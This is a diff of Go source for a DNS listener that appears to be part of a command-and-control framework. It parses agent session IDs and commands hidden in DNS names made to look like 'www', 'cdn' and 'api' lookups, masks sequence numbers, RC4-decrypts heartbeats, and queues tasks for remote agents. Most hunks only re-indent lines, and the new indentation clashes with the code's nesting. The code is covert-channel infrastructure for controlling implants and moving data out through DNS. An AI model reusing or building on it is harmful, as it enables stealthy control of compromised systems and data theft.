@@ -244,7 +244,7 @@ func decompressUpstream(data []byte) []byte {
 	flags := data[0]
 	origLen := binary.LittleEndian.Uint32(data[1:5])
 	payload := data[5:]
-
+	
 	if (flags & 0x1) != 0 {
 		if origLen > 0 && origLen <= maxUploadSize {
 			zr, err := zlib.NewReader(bytes.NewReader(payload))
@@ -398,50 +398,50 @@ func (d *DNSListener) cleanupLoop() {
 		d.cleanupStaleEntries()
 		d.saveInflights()
 	}
-}
+		}
 
 func (d *DNSListener) cleanupStaleEntries() {
-	now := time.Now()
+		now := time.Now()
 
-	d.mu.Lock()
+		d.mu.Lock()
 	defer d.mu.Unlock()
 
-	for sid, fb := range d.upFrags {
-		if now.Sub(fb.lastUpdate) > staleTimeout {
+		for sid, fb := range d.upFrags {
+			if now.Sub(fb.lastUpdate) > staleTimeout {
 			// Mark this SID as needing reset - the agent will be notified on next PUT/HB
 			if fb.filled > 0 && fb.filled < fb.total {
 				d.needsReset[sid] = true
 			}
-			delete(d.upFrags, sid)
+				delete(d.upFrags, sid)
+			}
 		}
-	}
 
-	for sid, done := range d.upDoneCache {
-		if now.Sub(done.doneAt) > dedupTimeout {
-			delete(d.upDoneCache, sid)
+		for sid, done := range d.upDoneCache {
+			if now.Sub(done.doneAt) > dedupTimeout {
+				delete(d.upDoneCache, sid)
+			}
 		}
-	}
 
-	for sid, db := range d.downFrags {
-		if db == nil {
-			delete(d.downFrags, sid)
-			continue
+		for sid, db := range d.downFrags {
+			if db == nil {
+				delete(d.downFrags, sid)
+				continue
+			}
+			if !db.lastUpdate.IsZero() && now.Sub(db.lastUpdate) > downTimeout {
+				delete(d.downFrags, sid)
+			}
 		}
-		if !db.lastUpdate.IsZero() && now.Sub(db.lastUpdate) > downTimeout {
-			delete(d.downFrags, sid)
-		}
-	}
 
-	for sid, inf := range d.localInflights {
-		if inf == nil {
-			delete(d.localInflights, sid)
-			continue
+		for sid, inf := range d.localInflights {
+			if inf == nil {
+				delete(d.localInflights, sid)
+				continue
+			}
+			if now.Sub(inf.createdAt) > inflightTimeout || inf.attempts >= maxInflightAttempts {
+				delete(d.localInflights, sid)
+				delete(d.downFrags, sid)
+			}
 		}
-		if now.Sub(inf.createdAt) > inflightTimeout || inf.attempts >= maxInflightAttempts {
-			delete(d.localInflights, sid)
-			delete(d.downFrags, sid)
-		}
-	}
 
 	// Clean up old reset markers (after 10 minutes, agent should have received them)
 	// This is handled implicitly - markers are deleted when PUT is received
@@ -481,8 +481,8 @@ func (d *DNSListener) saveInflights() {
 
 	data, err := json.Marshal(items)
 	if err != nil {
-		return
-	}
+			return
+		}
 	_ = os.WriteFile(d.inflightPersistPath(), data, 0600)
 }
 
@@ -519,23 +519,23 @@ func (d *DNSListener) loadInflights() {
 
 // Request Parsing
 func (d *DNSListener) parseRequest(q dns.Question) *dnsRequest {
-	labels := dns.SplitDomainName(q.Name)
-	base := labels
+		labels := dns.SplitDomainName(q.Name)
+		base := labels
 
-	if len(d.Config.Domains) > 0 {
-		for i := range labels {
-			tail := strings.ToLower(strings.Join(labels[i:], "."))
-			for _, dom := range d.Config.Domains {
-				if tail == dom {
-					base = labels[:i]
+		if len(d.Config.Domains) > 0 {
+			for i := range labels {
+				tail := strings.ToLower(strings.Join(labels[i:], "."))
+				for _, dom := range d.Config.Domains {
+					if tail == dom {
+						base = labels[:i]
+						break
+					}
+				}
+				if len(base) < len(labels) {
 					break
 				}
 			}
-			if len(base) < len(labels) {
-				break
-			}
 		}
-	}
 
 	req := new(dnsRequest)
 	req.qtype = q.Qtype
@@ -546,26 +546,26 @@ func (d *DNSListener) parseRequest(q dns.Question) *dnsRequest {
 	}
 
 	req.sid = strings.ToLower(base[0])
-	rawOp := strings.ToLower(base[1])
+			rawOp := strings.ToLower(base[1])
 
-	switch rawOp {
-	case "www", "hi":
+			switch rawOp {
+			case "www", "hi":
 		req.op = "HI"
-	case "cdn", "put":
+			case "cdn", "put":
 		req.op = "PUT"
-	case "api", "get":
+			case "api", "get":
 		req.op = "GET"
-	case "hb":
+			case "hb":
 		req.op = "HB"
-	}
+			}
 
-	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
+			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
 		req.seq = int(v ^ seqXorMask)
-	}
+			}
 
 	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
-	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
-	if db, err := enc.DecodeString(dataLabel); err == nil {
+			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
+			if db, err := enc.DecodeString(dataLabel); err == nil {
 		req.data = db
 	}
 
@@ -707,23 +707,23 @@ func (d *DNSListener) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
 	}
 	_ = reqNonce
 
-	d.mu.Lock()
+				d.mu.Lock()
 	df, exists := d.downFrags[req.sid]
 	if exists && df != nil {
-		df.lastUpdate = time.Now()
-		if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
-			df.off = reqOffset
-		}
-	}
-	d.mu.Unlock()
+						df.lastUpdate = time.Now()
+						if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
+							df.off = reqOffset
+					}
+				}
+				d.mu.Unlock()
 
-	if df == nil || df.off >= df.total {
-		if df != nil && df.off >= df.total {
-			d.mu.Lock()
+			if df == nil || df.off >= df.total {
+				if df != nil && df.off >= df.total {
+					d.mu.Lock()
 			delete(d.downFrags, req.sid)
-			d.mu.Unlock()
-			df = nil
-		}
+					d.mu.Unlock()
+					df = nil
+				}
 
 		taskData, taskNonce := d.fetchOrRetryTasks(req.sid)
 		if len(taskData) > 0 {
@@ -744,12 +744,12 @@ func (d *DNSListener) handleHB(req *dnsRequest) (needsReset bool, hasPendingTask
 	}
 
 	// Check if this SID needs reset
-	d.mu.Lock()
+				d.mu.Lock()
 	if d.needsReset[req.sid] {
 		needsReset = true
 		delete(d.needsReset, req.sid)
 	}
-	d.mu.Unlock()
+				d.mu.Unlock()
 
 	decrypted := rc4Crypt(req.data, d.Config.EncryptKey)
 
@@ -781,8 +781,8 @@ func (d *DNSListener) handleHB(req *dnsRequest) (needsReset bool, hasPendingTask
 			d.downFrags[req.sid] = newDownBuf(taskData, taskNonce)
 			d.mu.Unlock()
 			hasPendingTasks = true
-		}
-	} else {
+									}
+								} else {
 		hasPendingTasks = true
 	}
 
@@ -808,7 +808,7 @@ func (d *DNSListener) handlePutFragment(sid string, seq int, data []byte, ack pu
 	meta, rest, hasMeta := parseMetaV1(data)
 	if hasMeta {
 		if (meta.MetaFlags & 0x1) != 0 {
-			d.mu.Lock()
+						d.mu.Lock()
 			df, hasDf := d.downFrags[sid]
 			var ackTaskNonce uint32
 			shouldAck := false
@@ -821,14 +821,14 @@ func (d *DNSListener) handlePutFragment(sid string, seq int, data []byte, ack pu
 			d.mu.Unlock()
 
 			if shouldAck {
-				d.mu.Lock()
+					d.mu.Lock()
 				delete(d.localInflights, sid)
 				if cur, ok := d.downFrags[sid]; ok && cur != nil && cur.taskNonce == ackTaskNonce {
 					delete(d.downFrags, sid)
 				}
-				d.mu.Unlock()
+					d.mu.Unlock()
+				}
 			}
-		}
 
 		if len(rest) <= 8 {
 			_ = d.ts.TsAgentProcessData(sid, rest)
